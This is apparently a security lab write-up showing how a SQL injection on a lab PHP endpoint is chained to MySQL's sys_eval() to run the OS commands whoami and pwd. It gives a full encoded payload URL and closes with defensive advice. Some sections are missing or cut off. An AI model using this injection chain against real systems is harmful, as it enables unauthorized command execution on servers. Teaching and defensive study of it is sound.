# 🔐 Task — SQL Injection to OS Command Execution

## 📌 Lab Objective

The objective of this task is to use an existing **SQL Injection vulnerability** to execute operating-system commands through the MySQL `sys_eval()` function.

The two commands used in this lab are:

```
whoami
pwd
```

The workflow is:

```
SQL Injection
      ↓
UNION SELECT
      ↓
sys_eval()
      ↓
OS Command Execution
      ↓
whoami
      ↓
pwd
```

> **Environment:** Authorized security lab
> 
> 
> **Target:** `10.49.128.18:8000`
> 
> **Vulnerable endpoint:** `/os_sqli.php`
> 
> **Parameter:** `user`
> 

---

# 1. Understand the Injection

The vulnerable parameter is:

```
user
```

The basic structure of the injection is:

```sql
lannister' UNION SELECT ... -- //
```

The important components are:

| Component | Purpose |
| --- | --- |
| `lannister` | Original parameter value |
| `'` | Terminates the original SQL string |
| `UNION SELECT` | Adds an attacker-controlled query |
| `null` | Fills unused UNION columns |
| `sys_eval()` | Executes an OS command |
| `-- //` | Comments out the remainder of the original query |

---

# 2. Determine the UNION Column Structure

For this lab, the working UNION query uses **five columns**.

The first four positions are filled with:

```sql
null,null,null,null
```

The fifth position contains the command-execution function:

```sql
sys_eval(...)
```

Therefore, the basic structure is:

```sql
UNION SELECT
    null,
    null,
    null,
    null,
    sys_eval('COMMAND')
```

Conceptually:

```
Column 1 → NULL
Column 2 → NULL
Column 3 → NULL
Column 4 → NULL
Column 5 → sys_eval()
```

The fifth column is therefore being used to return the command output.

---

# 3. Step 1 — Execute `whoami`

The first objective is to determine **which operating-system user is executing the command**.

Use the following URL:

```
http://10.49.128.18:8000/os_sqli.php?user=lannister%27%20union%20SELECT%20null,null,null,null,%20sys_eval(%27whoami%27)%20--%20//
```

### Decoded form

The URL-encoded payload corresponds approximately to:

```sql
lannister' UNION SELECT null,null,null,null, sys_eval('whoami') -- //
```

# 5. Burp Suite Method

Instead of directly entering the URLs into the browser, the requests can also be inspected using **Burp Suite**.

### Workflow

```
Browser
   ↓
Burp Proxy
   ↓
Capture Request
   ↓

   ↓

```
GET /os_sqli.php?user=<PAYLOAD> HTTP/1.1

# 8. Why Four `NULL` Values?

The UNION query requires five expressions:

```sql
SELECT null,null,null,null,sys_eval('pwd')
```

They correspond to:

```
┌──────────┬──────────┬──────────┬──────────┬────────────────┐
│ Column 1 │ Column 2 │ Column 3 │ Column 4 │   Column 5     │
├──────────┼──────────┼──────────┼──────────┼────────────────┤
│   NULL   │   NULL   │   NULL   │   NULL   │ sys_eval('pwd')│
└──────────┴──────────┴──────────┴──────────┴────────────────┘
```

The first four columns are simply placeholders.

The fifth column is used to return the output generated by `sys_eval()`.

# 9. Key Learning

This task demonstrates how a SQL Injection vulnerability can become significantly more serious when a dangerous MySQL UDF capable of executing operating-system commands is available.

The important chain is:

```
SQL Injection
      ↓
UNION SELECT
      ↓
MySQL UDF
      ↓
sys_eval()
      ↓
OS Command Execution
```

In this exercise:

```
sys_eval('whoami')
        ↓
Identify executing OS user

sys_eval('pwd')
        ↓
Identify target working directory
```

### Main Takeaway

> **`sys_eval()` returns the output of an operating-system command, allowing the SQL Injection vulnerability to expose information from the target server's operating-system environment.**
>

# 🛡️ Defensive Perspective

This type of vulnerability should be addressed at multiple levels.

### Application Layer

Use parameterized SQL queries:

```
User Input
    ↓
Prepared Statement
    ↓
Bound Parameter
    ↓
Database
```

### Database Layer

Avoid enabling unnecessary UDFs that provide operating-system command execution.

### Operating-System Layer

Run database services with the minimum privileges required.

### Monitoring Layer

Monitor for:

- Unexpected SQL syntax
- UNION-based injection attempts
- Calls to dangerous UDFs
- Unexpected OS command execution
- Suspicious database process behavior
